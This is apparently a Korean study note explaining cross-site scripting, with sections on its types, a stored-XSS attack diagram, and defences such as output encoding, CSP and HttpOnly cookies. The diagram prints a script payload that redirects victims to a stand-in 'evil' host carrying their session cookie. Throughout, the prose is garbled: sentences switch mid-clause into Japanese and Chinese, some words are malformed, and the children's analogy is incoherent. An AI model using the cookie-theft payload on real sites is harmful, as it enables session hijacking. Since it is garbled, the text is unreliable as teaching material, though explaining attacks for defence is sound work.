# XSS (크로스 사이트 스크립팅)

## 핵심 인사이트 (3줄 요약)
> 1. **본질**: XSS (Cross-Site Scripting) 는 공격자가웹 페이지에 악성 스크립트를 주입하여, 해당 페이지를 조회하는 다른 사용자의 브라우저에서 그 스크립트가 실행되게 하는 공격이다. 기밀정보 (세션 쿠키 등) 탈취, 페이지 변조, 악성코드 배포 등에利用된다.
> 2. **가치**: XSS는 OWASP Top 10의 常連이며, Facebook, Google, PayPal 등major 사이트들도 역사적으로 XSS 취약점에 노출되었다. 세션 쿠키 탈취는authenticated 사용자로 가장한 공격을可能하게 한다.
> 3. **융합**: 방어에는 입력 검증, 출력 인코딩, CSP (Content Security Policy), HttpOnly 쿠키 속성 등을 함께 적용해야 한다.

---

## Ⅰ. 개요 및 필요성

### 개념 정의

XSS는 공격자가웹 애플리케이션에 악성 스크립트 (주로 JavaScript) 를 주입하여, 해당 앱을 이용하는 other使用자의 브라우저에서 스크립트가 실행되게 하는 보안 취약점이다. 이場合,攻撃者の스크립트는 victim's 브라우저에서 victim의 권한으로 실행되므로, 세션 쿠키 탈취, 키로깅,ページ篡改, 악성코드 배포 등의 공격이 가능하다.

### 필요성

XSS는웹의本质 (사용자 입력 → 동적 콘텐츠 생성) 에서 비롯되는 취약점으로,動的 웹 콘텐츠를生成하는 모든 애플리케이션에潜在한다.攻撃成功 시 서버 전체를침투하지 않더라도, 用户ブラウザ에서 script를 실행하여 사용자의 자격 증명을 탈취하거나 추가 공격의踏台석으로 삼을 수 있다.

### 비유

XSS는**다른 사람에게 몰래 떨어뜨리는 추적기**와 같다.公共汽车的座位에 조심스럽게 작은 추적기를 붙여두면, 그 버스를 이용하는 사람이 모두 추적기의 위치 정보를 전송한다. 비슷하게, 웹 페이지에 조심스럽게 악성 스크립트를 심어두면, 그 페이지를 보는 모든 사람에게서 정보를 탈취할 수 있다.

### 등장 배경

XSS는 1990년대 말~2000년대 초두 网站의동적 콘텐츠 증가와 함께 발견되기 시작했다. 최초에는 CSS 기반 공격으로 생각되었지만, JavaScript의 도입으로 세션 쿠키 탈취 등의 심각한 공격이 가능해졌다. 2007년 Twitter, 2010년 Facebook 등 major 플랫폼들도 XSS 공격에 노출되었다.

```text
  ┌──────────────────────────────────────────────────────────────┐
  │              XSS 유형 분류                                         │
  ├──────────────────────────────────────────────────────────────┤
  │
  │  【1. Stored (Persistent) XSS】                              │
  │  - 공격 스크립트가 서버에 저장됨 (DB 등)                     │
  │  - 해당 페이지를 조회하는 모든 사용자에게 스크립트 실행      │
  │  - 가장 위험한 유형                                          │
  │  예: 블로그 게시글, 프로필 정보, 댓글                      │
  │
  │  【2. Reflected (Non-Persistent) XSS】                       │
  │  - 스크립트가 서버의 응답에 즉시반영됨 (URL 파라미터 등)    │
  │  - 사용자가 specially crafted된 링크를 클릭해야 실행         │
  │  例: 검색 결과 페이지에 검색어 직접 표시                     │
  │
  │  【3. DOM-Based XSS】                                       │
  │  - 서버-side가 아니라 client-side JavaScript에서 발생       │
  │  - 브라우저의 DOM 조작 시 취약한 코드 실행                  │
  │  - 서버 로그나 응답에는 악성 스크립트가 보이지 않음         │
  │
  └──────────────────────────────────────────────────────────────┘
```

**[다이어그램 해설]** XSS의 세 유형은 스크립트가 주입되고 실행되는 위치에 따라 구분된다. Stored XSS는 서버에永続적으로 저장되어, 모든 사용자에게 영향을 미치므로 가장 위험하다. Reflected XSS는 사용자가 공격자가仕掛けたリンクをクリックするたびにスクリプトが実行される。DOM-Based XSSはサーバー側で完全に処理されるのではなく、ブラウザ内のJavaScriptがユーザー入力を不安全な方法でDOM操作する場合发生する。

## Ⅱ. 아키텍처 및 핵심 원리

### Stored XSS 공격 흐름

```text
  ┌──────────────────────────────────────────────────────────────┐
  │              Stored XSS 공격 흐름                                 │
  ├──────────────────────────────────────────────────────────────┤
  │
  │  1. 공격자가 악성 스크립트가 포함된 콘텐츠 제출                 │
  │                                                              │
  │     ┌─────────────────────────────────────────────┐          │
  │     │ <script>document.location='https://evil?  │          │
  │     │ c='+document.cookie</script>              │          │
  │     └─────────────────────────────────────────────┘          │
  │                     │                                            │
  │                     ▼                                            │
  │     ┌─────────────────────────────┐                           │
  │     │ 서버 (DB에 스크립트 저장)    │                           │
  │     │ 예: 프로필, 댓글, 게시글     │                           │
  │     └─────────────────────────────┘                           │
  │                                                              │
  │  2. 피해자가 해당 페이지를 조회                               │
  │                                                              │
  │     │ 사용자 A가 사용자 B의 프로필 열람                       │
  │     │                                                      │
  │     ▼                                                        │
  │     ┌─────────────────────────────┐                          │
  │     │ 서버가 스크립트 포함된 페이지 응답                       │
  │     └─────────────────────────────┘                          │
  │                                                              │
  │  3. 피해자 브라우저에서 스크립트가 실행됨                      │
  │                                                              │
  │     ▼                                                        │
  │     ┌─────────────────────────────────────────────┐         │
  │     │ 브라우저가 스크립트를 실행:                     │         │
  │     │ document.location='https://evil?c='+cookie   │         │
  │     │ → 사용자의 세션 쿠키가 공격자 서버로 전송!    │         │
  │     └─────────────────────────────────────────────┘         │
  │
  │  ※ 공격자는 자신의 쿠키를 몰라도, 쿠키를 공격자 서버로 전송받아 │
  │    그 사용자로 가장 가능!                                       │
  └──────────────────────────────────────────────────────────────┘
```

**[다이어그램 해설]** Stored XSS의怖い점은"자연스럽게 게시물을 올리면" 누구나 浏览할 때 자동으로 공격에 노출된다는 것이다.攻撃者のスクリプトが 保存され、被害者のブラウザが 要求するたびに 执行される。スクリプトは document.location로 使用자의 쿠키를 공격자 서버로 전송할 수 있어, 공격자는被害자의 세션에 접근하여"そのユーザーとして行動する"ことができてしまう。

## Ⅲ. 방어 기법

### 방어 기법 비교

| 방어 기법 | 설명 | 적용 위치 |
|:---|:---|:---|
| **입력 검증 (Input Validation)** | 화이트리스트 방식으로 입력값 검증 | 서버 (수신 시) |
| **출력 인코딩 (Output Encoding)** | HTML 특수문자를 엔티티로 변환 | 서버 (출력 시) |
| **CSP (Content Security Policy)** | 브라우저에서 허용할 수 있는 콘텐츠 소스 제한 | HTTP 헤더 |
| **HttpOnly 쿠키** | JavaScript에서 쿠키 접근 불가 | HTTP 헤더 |
| **WAF** |已知 XSS 패턴 탐지/차단 | 네트워크 |

```text
  ┌──────────────────────────────────────────────────────────────┐
  │              출력 인코딩 예시                                     │
  ├──────────────────────────────────────────────────────────────┤
  │
  │  사용자 입력: <script>alert('XSS')</script>                 │
  │
  │  【HTML 인코딩 적용】                                         │
  │  &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;    │
  │                                                              │
  │  브라우저가 이를 일반 텍스트로 표시하여,                     │
  │  스크립트로 인식하지 않음                                     │
  │
  │  ※ 입력 검증과 출력 인코딩을 함께使用해야 효과적            │
  └──────────────────────────────────────────────────────────────┘
```

## Ⅳ. 실무 적용 및 기술사적 판단

### 실무 시나리오

1. **시나리오 — 프로필 Stored XSS**: 사용자가 프로필에 이름 입력 시 스크립트를 포함할 수 있는 XSS 취약점. 아키니어는 서버 측 출력 인코딩 적용, CSP 헤더 추가, 프로필 업데이트 시 악성 패턴 검증으로 방어한다.

2. **시나리오 — 쿠키 탈취 방지**: XSS로 세션 쿠키를 탈취하려는 시도가 있을 때. 아키니어는 HttpOnly 속성으로 쿠키를 보호하고,Secure属性로 HTTPS에서만 쿠키 전송을 제한한다.

### 도입 체크리스트

- **기술적**: 모든 사용자 입력에 대해 출력 인코딩이 적용되어 있는가? CSP가 설정되어 있는가?
- **운영·보안적**: 정기적으로 XSS 취약점 스캐닝이 실시되고 있는가?

### 안티패턴

- **Client-side 인코딩만 믿기**: Client-side 인코딩은 우회될 수 있으므로 Server-side 인코딩이 필수다.
- **모듈墟頼**: 오픈소스 라이브러리도 XSS 취약점을 포함할 수 있으므로, 의존성 관리와 업데이트가 중요하다.

## 📌 관련 개념 맵 (Knowledge Graph)

| 개념 명칭 | 관계 및 시너지 설명 |
|:---|:---|
| **CSP (Content Security Policy)** | 브라우저에서 허용할 수 있는 스크립트 출처를 제한하여 XSS 공격을 방어한다. |
| **HttpOnly 쿠키** | JavaScript에서 액세스할 수 없는 쿠키로, XSS를 통한 쿠키 탈취를 방지한다. |

| **Stored XSS** | 서버에 저장되어 모든 사용자에게 영향을 미치는 가장 위험한 XSS 유형이다. |

## 👶 어린이를 위한 3줄 비유 설명

1. XSS는**친구가 우리 집에 들어와서 몰래Everyone의 지문을 수집하는 것**과 같아. 그 친구가公共汽车的座位에 자기 지문을 심어두면, 그 버스를 탄 사람은 다 자신의 지문이 가는 것처럼, 웹 페이지에 스크립트를 심어두면 그 페이지를 보는 사람마다 스크립트가 실행돼.
2. 가장 무서운 건 그 스크립트가"내 세션 정보를 외부로 보내는" 것이야.これにより、攻撃者はあなたになりすまして行動できる。
3. 그래서 컴퓨터는 글을 쓸 때 그냥 글자로 인식하지 않고"프로그램으로 실행하려고" 하는데,重要한 것은 글자를 그냥 글자로만 출력하게Processing해버리는 거야!
